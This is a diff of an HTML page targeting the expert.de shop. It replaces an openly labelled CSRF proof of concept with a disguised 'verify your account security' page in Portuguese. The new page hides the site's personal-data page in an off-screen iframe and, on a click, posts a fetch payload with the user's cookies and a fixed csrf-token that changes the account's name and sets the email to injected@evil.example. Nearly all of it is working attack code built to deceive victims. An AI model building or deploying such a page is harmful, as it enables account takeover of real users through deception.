@@ -1,36 +1,36 @@
 <!doctype html>
 <html lang="pt">
-<title>Expert.de – CSRF PoC</title>
-<meta charset="utf-8">
-<body style="font-family:sans-serif;text-align:center;margin-top:20vh">
-  <h2>Clique abaixo para alterar o e-mail da sua conta</h2>
-  <button onclick="poc()">Executar CSRF</button>
-  <pre id="log"></pre>
+<title>Verificar segurança da sua conta Expert</title>
+<body style="text-align:center;padding-top:30vh">
+  <h3>Clique para verificar</h3>
+  <button onclick="go()">Verificar</button>
+
+<iframe id="g" src="https://www.expert.de/shop/mein-expert/persoenliche-daten" style="position:absolute;left:-9999px"></iframe>
 
 <script>
-function log(txt){document.getElementById('log').textContent+=txt+'\n';}
-
-function poc(){
-  log('Enviando...');
-  fetch('https://www.expert.de/api/neo/frontend/_api/user/changeBasicUserData',{
-    method:'POST',
-    credentials:'include',
-    headers:{
-      'Content-Type':'application/json',
-      'csrf-token':'722402ba-cab2-4fb4-bf4d-b79747753775'
-    },
-    body:JSON.stringify({
-      userData:{
-        firstname:'Ana',
-        lastname:'Silvana',
-        email:'csrf-poc@evil.example',
-        birthday:-86400000,
-        gender:'FEMALE'
-      }
+function go(){
+  const w=document.getElementById('g').contentWindow;
+  w.postMessage(`
+    fetch('/api/neo/frontend/_api/user/changeBasicUserData',{
+      method:'POST',
+      credentials:'include',
+      headers:{
+        'Content-Type':'application/json',
+        'csrf-token':'722402ba-cab2-4fb4-bf4d-b79747753775'
+      },
+      body:JSON.stringify({
+        userData:{
+          firstname:'Pwn',
+          lastname:'ed',
+          email:'injected@evil.example',
+          birthday:-86400000,
+          gender:'FEMALE'
+        }
+      })
     })
-  })
-  .then(r=>{log('HTTP '+r.status); return r.text()})
-  .then(t=>log('Resposta: '+t))
-  .catch(e=>log('Erro: '+e));
+    .then(r=>alert('HTTP '+r.status));
+  `,'https://www.expert.de');
 }
 </script>
+</body>
+</html>
